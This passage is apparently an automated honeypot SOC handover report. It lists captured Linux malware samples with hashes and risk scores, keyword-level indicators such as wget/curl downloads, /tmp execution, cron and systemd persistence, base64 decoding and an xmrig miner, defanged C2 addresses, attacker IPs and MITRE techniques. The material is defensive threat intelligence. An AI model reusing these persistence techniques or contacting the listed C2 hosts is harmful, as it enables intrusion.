| `16254f69dc7011bdd51beb489af5e9825959e4098e565332da99f8cb58b7a76e` | ELF Binary (Linux executable) (x86 32-bit) | `16254f69dc7011bd...` | 30/100 | 🟢 LOW | **1/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` | ELF Binary (Linux executable) (MIPS 32-bit) | `1913ed2ad175632b...` | 86/100 | 🔴 HIGH | **42/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1c847d3bd3ef4bf7e21a7091f1479e0e2ca432585ebea996653845b9adfb150e` | ELF Binary (Linux executable) (x86-64 64-bit) | `1c847d3bd3ef4bf7...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ec20680994f17b88492809aa5d135fb463c04ec5868639c5515126e2149a240` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ec20680994f17b8...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` (0583d9e18684b6297a1219d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Hardware recon` — `cat /proc/cpuinfo`

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` (1913ed2ad175632b1b75e99b...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`
- `Crypto miner binary` — `xmrig`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `189.50.142[.]78` | BR | SAMM TECNOLOGIA E TELECOMUNICACOES S.A | **100** ⚠️ | 50 |
| `50.6.225[.]165` | US | Newfold Digital, Inc. | **100** ⚠️ | 2 |
| `82.38.134[.]233` | US | DanBot Hosting LTD | **100** ⚠️ | 0 |
| `130.61.148[.]1` | DE | Oracle Public Cloud | **100** ⚠️ | 4 |
| `138.226.239[.]233` | NL | Vlad Cojuhari | **100** ⚠️ | 50 |
| `163.125.145[.]196` | CN | China Unicom Guangdong province network | **100** ⚠️ | 2 |
| `109.160.32[.]48` | DE | Global Communication Net Plc | **100** ⚠️ | 28 |
| `111.228.12[.]232` | CN | eleven street,No. 18 Institute of Jingdong headquarters | **100** ⚠️ | 2 |
| `116.255.227[.]108` | CN | Zhengzhou Gainet Computer Network Technology Co.,Ltd. | **100** ⚠️ | 10 |
| `107.180.212[.]169` | US | Pure Nodal, Inc. | **100** ⚠️ | 16 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 552 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 484 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 227 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 194 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 37 |

---

## 🔕 False Positive Summary (50 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 23 |
| AbuseIPDB score 12 below threshold 25 | 1 |
| AbuseIPDB score 14 below threshold 25 | 1 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| AbuseIPDB score 21 below threshold 25 | 2 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| AbuseIPDB score 3 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 17 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 700 cases |
| Tool 34  | Credential Extractor        | ✅ 8272 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 30 fingerprints |
| Tool 36  | Command Clustering          | ✅ 54 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 381 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 50 filtered (7.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 141 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 38 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 481 priority case(s) shown individually · 152 recon entry/entries in table (13 group(s) consolidating 30 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-10-30T17:26:37Z_
